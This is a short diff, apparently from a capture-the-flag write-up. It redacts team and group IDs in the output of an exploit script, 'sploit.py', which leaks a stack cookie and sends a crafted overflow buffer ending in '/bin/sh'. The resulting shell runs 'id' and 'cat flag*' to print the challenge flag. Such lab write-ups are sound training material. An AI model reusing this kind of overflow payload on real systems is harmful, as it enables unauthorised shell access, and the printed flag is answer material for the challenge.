@@ -244,7 +244,7 @@ $ ./sploit.py
 Cookie:  0xb822ed3b
 buffer has:AAAAAAAAAAAAAABBBBCCCCDDDDD`�L`��Lh������X�h�BBBBAAAAlvv/bin/sh
 id
-uid=1002(traveller) gid=1737(team735) groups=1737(team735),2503(ctf)
+uid=1002(traveller) gid=XXXX(teamXXX) groups=XXXX(teamXXX),2503(ctf)
 cat flag*
 flag{tim3Tr@veL_Al2ways_fOn}
 exit
